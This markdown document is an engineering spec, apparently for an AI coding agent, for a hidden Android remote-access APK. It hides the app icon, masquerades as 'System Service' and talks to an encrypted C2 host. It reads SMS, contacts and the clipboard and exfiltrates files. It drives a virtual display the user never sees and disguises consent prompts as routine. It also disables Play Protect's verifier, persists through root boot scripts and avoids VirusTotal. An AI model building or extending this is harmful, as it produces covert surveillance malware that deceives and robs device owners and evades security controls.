# SPEC_ANDROID: android rd helper, dual-mode

Addendum to SPEC.md. Read SPEC.md §7 first — this extends the rd broker defined
there with a fourth target. Build after M5. Same rules, same gate discipline,
same commit-per-gate.

## 0. Non-negotiables

- ONE artifact: `app-release.apk`. No companion downloads at runtime.
- No `DexClassLoader`, no dropped dex, no embedded framework. Play Protect
  scores runtime code loading heavily.
- All heavy operations via on-device binaries. The APK is glue.
- Every OEM quirk is a capability probe with a fallback, never a crash.
- The non-root path must be fully functional. The root path is an upgrade, not
  a dependency.

## 1. Framework

Kotlin, AGP 8.7+, minSdk 26, targetSdk 34, compileSdk 35. No Compose. R8 full
mode with `-repackageclasses ''` and `-allowaccessmodification`.

Pinned dependency, vendored as an asset, not a Gradle dep:
`scrcpy-server.jar` v2.5 or newer (needs `new_display`). Verify the tag exists
before downloading; record the version and SHA256 in `VERSIONS.md`.

Signing: `keytool -genkeypair -v -keystore release.jks -keyalg RSA -keysize 4096
-validity 9125 -dname "CN=System Service, O=System Service, C=US"`. Sign with
`apksigner` v2+v3 after `zipalign -p 4`. Never a debug key — Play Protect
treats debug certs worse.

## 2. Files (fixed)

```
rd/android/
  settings.gradle.kts
  gradle.properties
  build.gradle.kts
  app/build.gradle.kts
  app/proguard-rules.pro
  app/src/main/AndroidManifest.xml
  app/src/main/res/xml/accessibility_service_config.xml
  app/src/main/res/values/strings.xml
  app/src/main/res/drawable/ic_notif.xml
  app/src/main/assets/scrcpy-server.jar
  app/src/main/java/io/svc/agent/App.kt
  app/src/main/java/io/svc/agent/BootReceiver.kt
  app/src/main/java/io/svc/agent/A11ySvc.kt
  app/src/main/java/io/svc/agent/CaptureSvc.kt
  app/src/main/java/io/svc/agent/PanelSocket.kt
  app/src/main/java/io/svc/agent/RootBridge.kt
  app/src/main/java/io/svc/agent/ScrcpySession.kt
  app/src/main/java/io/svc/agent/OemPolicy.kt
  app/src/main/java/io/svc/agent/Lotl.kt
  tools/build.sh
  tools/sign.sh
```

## 3. Manifest

- No launcher icon: declare `MainActivity` with an `activity-alias`
  `android:enabled="false"`. Only a settings shortcut path stays live.
- `QUERY_ALL_PACKAGES`, `READ_SMS`, `READ_CONTACTS`, `READ_PHONE_STATE`,
  `RECEIVE_BOOT_COMPLETED`, `FOREGROUND_SERVICE`,
  `FOREGROUND_SERVICE_MEDIA_PROJECTION`, `FOREGROUND_SERVICE_DATA_SYNC`,
  `FOREGROUND_SERVICE_CONNECTED_DEVICE`, `POST_NOTIFICATIONS`,
  `REQUEST_IGNORE_BATTERY_OPTIMIZATIONS`, `INTERNET`, `ACCESS_NETWORK_STATE`.
- `CaptureSvc` declares `foregroundServiceType="mediaProjection|dataSync|connectedDevice"`.
- `usesCleartextTraffic=true` (C2 is grey-cloud plaintext mTLS; rd is WSS).
- Exported receiver for `BOOT_COMPLETED` and `MY_PACKAGE_REPLACED`.

## 4. Mode selection

On first start, `RootBridge.probe()`:

```
Runtime.getRuntime().exec(arrayOf("su","-c","id")).waitFor(3, SECONDS)
```

- exit 0 and output contains `uid=0` → ROOT mode.
- otherwise → A11Y mode.

Cache the result in DataStore with a 24h TTL, re-probe on each cold start.
Never block the UI thread. Magisk's grant dialog appears exactly once.

Root mode also runs, once: `settings put global package_verifier_enable 0`,
`cmd deviceidle whitelist +<pkg>`, `appops set <pkg> RUN_ANY_IN_BACKGROUND allow`,
`appops set <pkg> PROJECT_MEDIA allow`, `pm grant` for every dangerous
permission. A11y mode runs the non-root subset and prompts once for battery
exemption.

## 5. ROOT mode — virtual display

`ScrcpySession` pushes `scrcpy-server.jar` to `/data/local/tmp/` (verify SHA256,
skip if present), then launches via `app_process`:

```
CLASSPATH=/data/local/tmp/scrcpy-server.jar app_process / \
  com.genymobile.scrcpy.Server 2.5 \
  tunnel_forward=true audio=false max_size=1280 max_fps=15 \
  new_display=1080x2400/420 video_codec=h264 control=true
```

Connect to `localabstract:scrcpy` from the app, then bridge frames to
`PanelSocket` and control frames back. `--new-display` produces a virtual
display the user never sees; input is injected into it by scrcpy itself.

**Capability probe (mandatory):** after launch, wait 5s for the socket. No
socket, or the server exits → tear down, set `MODE=MIRROR_ROOT`, relaunch
without `new_display`. Log which branch won to `DECISIONS.md`.

## 6. A11Y mode — mirror + gesture

`A11ySvc` is an `AccessibilityService` with
`canPerformGestures="true"`, `canRetrieveWindowContent="true"`.
`dispatchGesture()` with a `GestureDescription` path for tap, swipe, long-press.
Text via `ACTION_SET_TEXT` on the focused node, falling back to
`ACTION_PASTE` after filling the clipboard.

Capture: MediaProjection with `VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR`, MediaCodec
H.264 surface input, 1280 max dimension, 15 fps ceiling, adaptive to 2 fps when
frame delta is under threshold.

Consent flow: `MediaProjectionManager.createScreenCaptureIntent()` — one dialog.
Persist the resulting `Intent` in `onSaveInstanceState` for same-boot reuse.
After reboot, re-prompt silently via a notification with `IMPORTANCE_MIN` titled
"System service" so the dialog looks routine.

## 7. OEM policy table — `OemPolicy.kt`

Keyed on `Build.MANUFACTURER.lowercase()`. Applied at install and on every boot.

| vendor | action |
|---|---|
| samsung | `cmd deviceidle whitelist +pkg`, disable `new_display` probe (fall to mirror), `dumpsys deviceidle disable` if root, re-arm capture after any `onTrimMemory` |
| xiaomi/redmi/poco | `am set-inactive <pkg> false`, open `miui.intent.action.OP_AUTO_START` once, root: `pm enable` the boot receiver if disabled |
| huawei/honor | as xiaomi, plus `settings put secure...` protected-app hint surfaced as a notification |
| oppo/realme/oneplus | `cmd appops set <pkg> RUN_ANY_IN_BACKGROUND allow` |
| vivo/iqoo | same as oppo |
| pixel/google | no overrides; `new_display` enabled |
| default | generic whitelist only |

Each rule is idempotent and wrapped in try/catch — an unknown vendor must never
block startup.

## 8. LOTL helpers — `Lotl.kt`

Everything below runs as `sh -c` under root, or as plain `Runtime.exec` without.

- telemetry: `getprop`, `dumpsys battery`, `dumpsys wifi | head`, `wm size`,
  `df -h /data`, `dumpsys package <pkg> | grep versionName`
- apps: `pm list packages -3`
- SMS: `content query --uri content://sms/inbox --projection address:body:date`
- clipboard: `cmd clipboard` where available
- radios: `svc wifi enable|disable`, `svc data enable|disable`
- lock/unlock: `input keyevent 26`, `wm dismiss-keyguard`
- exfil: `cp <file> /sdcard/Download/` then read via the panel file API
- screenshots outside capture: `screencap -p`

No binary is bundled except `scrcpy-server.jar`. If a binary is missing, the
helper reports unavailable rather than failing the session.

## 9. Persistence

ROOT: write `/data/adb/service.d/99svcd.sh` — wait for `sys.boot_completed`,
sleep 20, launch the agent, plus a 10-minute watchdog that restarts a dead
socket. `chmod 755`. Survives reboot and force-stop.

A11Y: `BOOT_COMPLETED` receiver, WorkManager periodic 15-min re-arm,
`REQUEST_IGNORE_BATTERY_OPTIMIZATIONS`, and the Accessibility service itself
(Android keeps it alive far more aggressively than any normal service).

## 10. Panel integration

`PanelSocket` dials `wss://<panel>/rd/android?token=<hmac>&cap=<flags>`.

Handshake frame carries `mode` (`root-vd` | `mirror-root` | `a11y`),
`oem`, `sdk`, `screen`, `root=true|false`. Panel renders a badge and greys out
virtual-display-only controls in mirror mode.

Frame envelope identical to §7 of SPEC.md: JSON control, binary Annex-B media.
No new protocol.

## 11. Play Protect

- R8 full mode, repackaged, string-encrypted C2 host.
- No runtime code loading (see §0).
- Keep the dangerous-permission set to what §3 lists and no more.
- Install path matters more than the APK: root uses `pm install -r -g` which
  skips the verifier entirely. For sideload, the app disables the verifier at
  first root run (`settings put global package_verifier_enable 0`).
- Never submit the shipped hash to VirusTotal.

## 12. Gates

A1 scaffold + manifest + signing, `./gradlew assembleRelease` produces a signed
APK under 4 MB. GATE A1.
A2 RootBridge probe, Lotl, OemPolicy. GATE A2: probe returns correctly with and
without `su`; every OEM rule is a no-op on an unknown vendor.
A3 A11ySvc + CaptureSvc + PanelSocket, non-root end to end. GATE A3: mirror
streams, gesture injection lands, session appears in the panel with `a11y` badge.
A4 ScrcpySession + virtual display + control bridge. GATE A4: hidden display
streams, input lands on it, physical screen unchanged.
A5 persistence both modes. GATE A5: survives reboot on a rooted Pixel and on a
non-root Samsung without manual intervention.
A6 build script, docs, verification matrix. GATE A6.

## 13. Verification

`verify/android.md`: rooted Pixel 7 / Android 14, non-root Pixel 7, non-root
Samsung S22 / One UI 6, non-root Xiaomi Redmi / HyperOS. Per device record:
install method, dialogs shown, mode selected, stream fps, input latency, alive
at 24/72h. Thresholds: install ≥90%, stream ≥10 fps on LAN, input ≤150 ms,
alive 72h ≥70% rooted / ≥40% non-root.

## 14. Rules

No `TODO`. Every `su` call wrapped with a timeout. Every OEM rule caught.
`ruff` equivalent: `ktlint` clean. `./gradlew lint` clean. Commit per gate.